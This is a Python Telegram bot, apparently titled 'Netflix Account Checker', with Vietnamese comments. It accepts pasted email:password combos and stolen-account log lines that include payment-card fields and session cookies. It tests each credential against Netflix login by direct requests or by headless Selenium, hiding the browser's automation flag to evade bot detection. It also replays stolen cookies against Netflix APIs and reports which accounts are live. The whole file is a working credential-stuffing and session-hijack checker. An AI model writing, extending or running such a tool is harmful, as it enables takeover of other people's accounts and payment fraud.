import os
import re
import time
import logging
import asyncio
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CẤU HÌNH ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("BOT_TOKEN chưa được đặt trong biến môi trường!")
    exit(1)

NETFLIX_LOGIN_URL = "https://www.netflix.com/vn/login"
NETFLIX_API_URL = "https://www.netflix.com/api/shakti/v4f72bc24/pathSets?viewportId=chromeSize"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ================== HÀM PARSE THÔNG TIN TÀI KHOẢN ==================
def parse_account_info(text: str) -> dict:
    """
    Parse thông tin tài khoản từ text.
    Format: email:password | Country = XX | PLAN = xxx | COST = $xxx | STREAMS = x | BILLING_DATE = xxx | PAYMENT_METHOD = xxx | Cookie = ...
    """
    result = {
        "email": "",
        "password": "",
        "country": "",
        "plan": "",
        "cost": "",
        "streams": "",
        "billing_date": "",
        "payment_method": "",
        "cookie": "",
        "member_plan": "",
        "user_on_hold": "",
        "membership_status": "",
        "max_streams": "",
        "video_quality": "",
        "connected_profiles": "",
        "has_extra_member": "",
        "phone_number": "",
        "email_verified": "",
        "member_since": "",
        "next_billing_date": "",
        "last4": "",
        "total_cc": "",
        "cc": ""
    }

    try:
        # Tách phần email:password
        if "|" in text:
            email_pass = text.split("|")[0].strip()
            if ":" in email_pass:
                email, password = email_pass.split(":", 1)
                result["email"] = email.strip()
                result["password"] = password.strip()

        # Parse các trường còn lại
        patterns = {
            "country": r"Country\s*=\s*([^\|]+?)(?:\s*\|)",
            "plan": r"PLAN\s*=\s*([^\|]+?)(?:\s*\|)",
            "cost": r"COST\s*=\s*([^\|]+?)(?:\s*\|)",
            "streams": r"STREAMS\s*=\s*([^\|]+?)(?:\s*\|)",
            "billing_date": r"BILLING_DATE\s*=\s*([^\|]+?)(?:\s*\|)",
            "payment_method": r"PAYMENT_METHOD\s*=\s*([^\|]+?)(?:\s*\|)",
            "cookie": r"Cookie\s*=\s*(.+?)(?:\s*\|[\w\s]*=|$)",
            "member_plan": r"memberPlan\s*=\s*([^\|]+?)(?:\s*\|)",
            "user_on_hold": r"UserOnHold\s*=\s*([^\|]+?)(?:\s*\|)",
            "membership_status": r"membershipStatus\s*=\s*([^\|]+?)(?:\s*\|)",
            "max_streams": r"maxStreams\s*=\s*([^\|]+?)(?:\s*\|)",
            "video_quality": r"videoQuality\s*=\s*([^\|]+?)(?:\s*\|)",
            "connected_profiles": r"connetedProfiles\s*=\s*([^\|]+?)(?:\s*\|)",
            "has_extra_member": r"hasExtraMember\s*=\s*([^\|]+?)(?:\s*\|)",
            "phone_number": r"phoneNumber\s*=\s*([^\|]+?)(?:\s*\|)",
            "email_verified": r"emailVerified\s*=\s*([^\|]+?)(?:\s*\|)",
            "member_since": r"memberSince\s*=\s*([^\|]+?)(?:\s*\|)",
            "next_billing_date": r"NextBillingDate\s*=\s*([^\|]+?)(?:\s*\|)",
            "last4": r"last4\s*=\s*\[([^\]]+)\](?:\s*\|)",
            "total_cc": r"TotalCC\s*=\s*([^\|]+?)(?:\s*\|)",
            "cc": r"CC\s*=\s*\[([^\]]+)\](?:\s*\|)"
        }

        for key, pattern in patterns.items():
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                result[key] = match.group(1).strip()

    except Exception as e:
        logger.error(f"Lỗi parse: {e}")

    return result


# ================== HÀM KIỂM TRA COOKIE ==================
def check_cookie_validity(cookie_str: str) -> dict:
    """
    Kiểm tra cookie có còn hoạt động không.
    Trả về dict với keys: valid (bool), reason (str)
    """
    if not cookie_str:
        return {"valid": False, "reason": "KHONG_CO_COOKIE"}

    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }

    try:
        # Parse cookie string thành dict
        cookies = {}
        for part in cookie_str.split(";"):
            if "=" in part:
                key, val = part.strip().split("=", 1)
                cookies[key] = val

        if not cookies:
            return {"valid": False, "reason": "COOKIE_KHONG_HOP_LE"}

        # Thử API 1 - profile list
        resp = session.get(
            "https://www.netflix.com/api/shakti/v4f72bc24/profileNavigation",
            headers=headers,
            cookies=cookies,
            timeout=15
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                if "profiles" in data:
                    # Kiem tra neu co profiles thi cookie con hoat dong
                    return {"valid": True, "reason": "COOKIE_HOAT_DONG"}
            except:
                pass

        # Thử API 2 - browse page
        resp2 = session.get(
            "https://www.netflix.com/browse",
            headers=headers,
            cookies=cookies,
            timeout=15,
            allow_redirects=False
        )

        if resp2.status_code == 200 and "browse" in resp2.url:
            return {"valid": True, "reason": "COOKIE_HOAT_DONG"}

        # Kiem tra neu redirect ve login thi cookie het hieu luc
        if resp.status_code in [302, 303, 307, 308] or "login" in resp.url:
            return {"valid": False, "reason": "COOKIE_HET_HIEU_LUC"}

        return {"valid": False, "reason": "COOKIE_KHONG_XAC_DINH"}

    except Exception as e:
        logger.warning(f"Lỗi kiểm tra cookie: {e}")
        return {"valid": False, "reason": f"LOI: {str(e)}"}


# ================== HÀM FORMAT KẾT QUẢ ==================
def format_account_result(info: dict, cookie_result: dict) -> str:
    """
    Format thông tin tài khoản thành chuỗi đẹp.
    """
    cookie_valid = cookie_result.get("valid", False)
    cookie_reason = cookie_result.get("reason", "")

    if cookie_valid:
        status = "HOẠT ĐỘNG"
    else:
        # Map reason to Vietnamese
        reason_map = {
            "COOKIE_HET_HIEU_LUC": "HẾT HIỆU LỰC",
            "KHONG_CO_COOKIE": "KHÔNG CÓ COOKIE",
            "COOKIE_KHONG_HOP_LE": "COOKIE KHÔNG HỢP LỆ",
            "COOKIE_KHONG_XAC_DINH": "KHÔNG XÁC ĐỊNH"
        }
        status = reason_map.get(cookie_reason, "KHÔNG XÁC ĐỊNH")

    result = f"""
📧 Email: {info['email']}
🔑 Password: {info['password']}
━━━━━━━━━━━━━━━━━━━━━━━━
🌍 Country: {info['country']}
📦 Plan: {info['plan']}
💰 Cost: {info['cost']}
🎬 Streams: {info['streams']}
📅 Billing Date: {info['billing_date']}
💳 Payment: {info['payment_method']}
━━━━━━━━━━━━━━━━━━━━━━━━
🔐 Member Plan: {info['member_plan']}
⚠️ User On Hold: {info['user_on_hold']}
📊 Status: {info['membership_status']}
🎥 Max Streams: {info['max_streams']}
🖥️ Video Quality: {info['video_quality']}
👥 Profiles: {info['connected_profiles']}
➕ Extra Member: {info['has_extra_member']}
📱 Phone: {info['phone_number']}
✅ Email Verified: {info['email_verified']}
📆 Member Since: {info['member_since']}
🔄 Next Billing: {info['next_billing_date']}
💳 Card: {info['cc']}
━━━━━━━━━━━━━━━━━━━━━━━━
🍪 Cookie: {cookie_reason}
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 TRANG THAI: {status}
"""
    return result.strip()


# ================== HÀM FORMAT KẾT QUẢ V2 (UU TIEN MAT KHAU) ==================
def format_account_result_v2(info: dict, login_result: dict, cookie_result: dict) -> str:
    """
    Format ket qua - uu tien ket qua dang nhap mat khau.
    """
    # Lay trang thai tu mat khau
    login_valid = login_result.get("valid", False)
    login_reason = login_result.get("reason", "KHONG_XAC_DINH")

    # Map ly do mat khau
    if login_valid:
        status = "✅ HOẠT ĐỘNG"
        status_detail = "ĐĂNG_NHẬP_THÀNH_CÔNG"
    else:
        reason_map = {
            "SAI_MAT_KHAU": "❌ SAI_MẬT_KHẨU",
            "TAI_KHOAN_KHONG_TON_TAI": "❌ TÀI_KHOẢN_KHÔNG_TỒN_TẠI",
            "TAI_KHOAN_BI_KHOA_TAM": "❌ BỊ_TẠM_KHÓA_(ON_HOLD)",
            "LOI_THANH_TOAN": "❌ LỖI_THANH_TOÁN",
            "TAI_KHOAN_HET_HAN": "❌ HẾT_HẠN",
            "KHONG_XAC_DINH": "❌ KHÔNG_XÁC_ĐỊNH",
            "LOI_TRUY_CAP": "❌ LỖI_TRUY_CẬP"
        }
        status = reason_map.get(login_reason, f"❌ {login_reason}")
        status_detail = login_reason

    # Cookie chi hien thi phu
    cookie_reason = cookie_result.get("reason", "")

    result = f"""
📧 Email: {info['email']}
🔑 Password: {info['password']}
━━━━━━━━━━━━━━━━━━━━━━━━
🌍 Country: {info['country']}
📦 Plan: {info['plan']}
💰 Cost: {info['cost']}
🎬 Streams: {info['streams']}
📅 Billing Date: {info['billing_date']}
💳 Payment: {info['payment_method']}
━━━━━━━━━━━━━━━━━━━━━━━━
🔐 Member Plan: {info['member_plan']}
⚠️ User On Hold: {info['user_on_hold']}
📊 Status: {info['membership_status']}
🎥 Max Streams: {info['max_streams']}
🖥️ Video Quality: {info['video_quality']}
👥 Profiles: {info['connected_profiles']}
➕ Extra Member: {info['has_extra_member']}
📱 Phone: {info['phone_number']}
✅ Email Verified: {info['email_verified']}
📆 Member Since: {info['member_since']}
🔄 Next Billing: {info['next_billing_date']}
💳 Card: {info['cc']}
━━━━━━━━━━━━━━━━━━━━━━━━
🍪 Cookie: {cookie_reason}
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 TRANG THAI: {status}
"""
    return result.strip()

# ================== HÀM KIỂM TRA BẰNG REQUESTS ==================
def check_with_requests(email: str, password: str) -> dict:
    """
    Thử đăng nhập bằng requests.
    Trả về dict với keys: valid (bool), reason (str)
    """
    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.netflix.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # 1. Lấy trang login để lấy CSRF token
        resp = session.get(NETFLIX_LOGIN_URL, headers=headers, timeout=30)
        if resp.status_code != 200:
            logger.warning(f"[Requests] Không thể truy cập trang login: {resp.status_code}")
            return {"valid": False, "reason": "LOI_TRUY_CAP", "method": "requests"}

        # Tìm token trong HTML
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        csrf_token = match.group(1) if match else ""

        # 2. Gửi POST đăng nhập
        login_payload = {
            "userLoginId": email,
            "password": password,
            "csrf_token": csrf_token,
            "rememberMe": "true",
            "flow": "websiteSignup",
            "mode": "login",
            "action": "loginAction",
        }
        login_resp = session.post(
            NETFLIX_LOGIN_URL,
            data=login_payload,
            headers=headers,
            timeout=30,
            allow_redirects=False
        )

        # Lấy response text để parse lỗi
        resp_text = login_resp.text.lower()

        # Kiểm tra các lỗi cụ thể (chi khi co response text)
        if login_resp.status_code != 302:
            if "incorrect password" in resp_text or "mat khau khong dung" in resp_text:
                return {"valid": False, "reason": "SAI_MAT_KHAU", "method": "requests"}

            if "we're sorry" in resp_text or "khong tim thay tai khoan" in resp_text:
                return {"valid": False, "reason": "TAI_KHOAN_KHONG_TON_TAI", "method": "requests"}

            if "your account is on hold" in resp_text or "tai khoan bi tam dung" in resp_text:
                return {"valid": False, "reason": "TAI_KHOAN_BI_KHOA_TAM", "method": "requests"}

            if "payment" in resp_text and ("issue" in resp_text or "problem" in resp_text):
                return {"valid": False, "reason": "LOI_THANH_TOAN", "method": "requests"}

            if "expired" in resp_text or "het han" in resp_text:
                return {"valid": False, "reason": "TAI_KHOAN_HET_HAN", "method": "requests"}

        # Nếu server trả về 302 (redirect) -> đăng nhập thành công
        if login_resp.status_code == 302 and "Set-Cookie" in login_resp.headers:
            # Thử truy cập trang browse để xác nhận
            browse_resp = session.get(
                "https://www.netflix.com/browse",
                headers=headers,
                timeout=30,
                allow_redirects=False
            )
            if browse_resp.status_code == 200 and "browse" in browse_resp.url:
                logger.info(f"[Requests] Thành công: {email}")
                return {"valid": True, "reason": "DANG_NHAP_THANH_CONG", "method": "requests"}

        return {"valid": False, "reason": "KHONG_XAC_DINH", "method": "requests"}

    except requests.exceptions.Timeout:
        logger.warning(f"[Requests] Timeout: {email}")
        return {"valid": False, "reason": "TIMEOUT", "method": "requests"}
    except requests.exceptions.ConnectionError:
        logger.warning(f"[Requests] Connection error: {email}")
        return {"valid": False, "reason": "MAT_KET_NOI_MANG", "method": "requests"}
    except Exception as e:
        logger.warning(f"[Requests] Lỗi: {e}")
        return {"valid": False, "reason": f"LOI: {str(e)[:50]}", "method": "requests"}

# ================== HÀM KIỂM TRA BẰNG SELENIUM ==================
def check_with_selenium(email: str, password: str) -> dict:
    """
    Kiểm tra bằng Selenium (dùng browser).
    Trả về dict với keys: valid (bool), reason (str)
    """
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument(f"user-agent={USER_AGENT}")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    driver = None
    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

        logger.info(f"[Selenium] Đang kiểm tra {email}")
        driver.get(NETFLIX_LOGIN_URL)
        wait = WebDriverWait(driver, 30)

        # Nhập email
        email_input = wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))
        email_input.clear()
        email_input.send_keys(email)

        # Nhập password
        pass_input = driver.find_element(By.NAME, "password")
        pass_input.clear()
        pass_input.send_keys(password)

        # Click nút đăng nhập
        login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_button.click()

        # Đợi chuyển hướng
        time.sleep(10)

        # Kiểm tra URL hiện tại
        current_url = driver.current_url
        page_source = driver.page_source.lower()

        # Kiểm tra lỗi cụ thể
        if "incorrect password" in page_source:
            return {"valid": False, "reason": "SAI_MAT_KHAU", "method": "selenium"}
        if "your account is on hold" in page_source:
            return {"valid": False, "reason": "TAI_KHOAN_BI_KHOA_TAM", "method": "selenium"}
        if "payment" in page_source and "issue" in page_source:
            return {"valid": False, "reason": "LOI_THANH_TOAN", "method": "selenium"}
        if "we're sorry" in page_source:
            return {"valid": False, "reason": "TAI_KHOAN_KHONG_TON_TAI", "method": "selenium"}

        # Kiểm tra thành công
        if "browse" in current_url or "profiles" in current_url:
            logger.info(f"[Selenium] Thành công: {email}")
            return {"valid": True, "reason": "DANG_NHAP_THANH_CONG", "method": "selenium"}

        return {"valid": False, "reason": "KHONG_XAC_DINH", "method": "selenium"}

    except Exception as e:
        logger.error(f"[Selenium] Lỗi: {e}")
        return {"valid": False, "reason": f"LOI: {str(e)[:50]}", "method": "selenium"}
    finally:
        if driver:
            driver.quit()


# ================== HÀM KIỂM TRA TỔNG HỢP ==================
async def check_account(email: str, password: str) -> str:
    """
    Kiểm tra một tài khoản: thử requests trước, nếu fail thì dùng Selenium.
    Trả về chuỗi kết quả với lý do cụ thể.
    """
    logger.info(f"Đang kiểm tra: {email}")

    # Thử requests trước
    result = check_with_requests(email, password)

    # Nếu requests timeout hoặc lỗi mạng, thử Selenium
    if result["reason"] in ["TIMEOUT", "MAT_KET_NOI_MANG", "LOI_TRUY_CAP"]:
        logger.info(f"[Requests] Thất bại, thử Selenium cho {email}")
        result = check_with_selenium(email, password)

    if result["valid"]:
        return f"✅ {email}:{password} | HOẠT ĐỘNG | {result['method']}"
    else:
        reason_map = {
            "SAI_MAT_KHAU": "SAI_MẬT_KHẨU",
            "TAI_KHOAN_KHONG_TON_TAI": "TÀI_KHOẢN_KHÔNG_TỒN_TẠI",
            "TAI_KHOAN_BI_KHOA_TAM": "BỊ_TẠM_KHÓA_(ON_HOLD)",
            "LOI_THANH_TOAN": "LỖI_THANH_TOÁN",
            "TAI_KHOAN_HET_HAN": "HẾT_HẠN",
            "KHONG_XAC_DINH": "KHÔNG_XÁC_ĐỊNH",
            "LOI_TRUY_CAP": "LỖI_TRUY_CẬP",
            "TIMEOUT": "TIMEOUT",
            "MAT_KET_NOI_MANG": "MẤT_KẾT_NỐI_MẠNG"
        }
        reason_text = reason_map.get(result["reason"], result["reason"])
        return f"❌ {email}:{password} | {reason_text}"

# ================== XỬ LÝ TELEGRAM BOT ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Netflix Account Checker\n\n"
        "Cách 1 (dạng cũ - kiểm tra mật khẩu):\n"
        "email1:password1\n\n"
        "Cách 2 (format đầy đủ - kiểm tra cookie):\n"
        "email:password | Country = XX | PLAN = ... | Cookie = ...\n\n"
        "Tra cứu: SAI_MẬT_KHẨU | BỊ_TẠM_KHÓA | LỖI_THANH_TOÁN | HẾT_HẠN | HOẠT_ĐỘNG"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("Vui long gui danh sach tai khoan.")
        return

    lines = text.splitlines()
    accounts = []
    parsed_accounts = []

    for line in lines:
        line = line.strip()
        if not line:
            continue

        # Kiem tra neu la format moi co |
        if "|" in line and ":" in line.split("|")[0]:
            # Parse format moi
            info = parse_account_info(line)
            if info['email'] and info['password']:
                parsed_accounts.append(info)
        elif ':' in line:
            # Format cu email:password
            email, password = line.split(':', 1)
            accounts.append((email.strip(), password.strip()))

    # Xu ly format cu
    if accounts:
        await update.message.reply_text(f"Đang kiểm tra {len(accounts)} tài khoản (dạng cũ)...")

        for email, password in accounts:
            result = await check_account(email, password)
            await update.message.reply_text(result)
            await asyncio.sleep(1)

    # Xu ly format moi
    if parsed_accounts:
        await update.message.reply_text(f"Đang phân tích {len(parsed_accounts)} tài khoản (format mới)...")

        for info in parsed_accounts:
            # Kiem tra mat khau truoc (quan trong nhat)
            login_result = check_with_requests(info['email'], info['password'])

            # Neu requests timeout/ loi, thu Selenium
            if login_result["reason"] in ["TIMEOUT", "MAT_KET_NOI_MANG", "LOI_TRUY_CAP"]:
                logger.info(f"[Requests] That bai, thu Selenium cho {info['email']}")
                login_result = check_with_selenium(info['email'], info['password'])

            # Neu login thanh cong thi khong can kiem tra cookie nua
            cookie_result = {"valid": False, "reason": "BO_QUA"}
            if info['cookie'] and not login_result["valid"]:
                try:
                    cookie_result = check_cookie_validity(info['cookie'])
                except Exception as e:
                    cookie_result = {"valid": False, "reason": f"LOI: {str(e)[:30]}"}

            # Format ket qua - uu tien mat khau
            result = format_account_result_v2(info, login_result, cookie_result)
            await update.message.reply_text(result)
            await asyncio.sleep(1)

    if not accounts and not parsed_accounts:
        await update.message.reply_text("Không tìm thấy tài khoản hợp lệ nào.")
        return

    await update.message.reply_text(f"Hoàn thành!")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot đang chạy...")
    application.run_polling()

if __name__ == "__main__":
    main()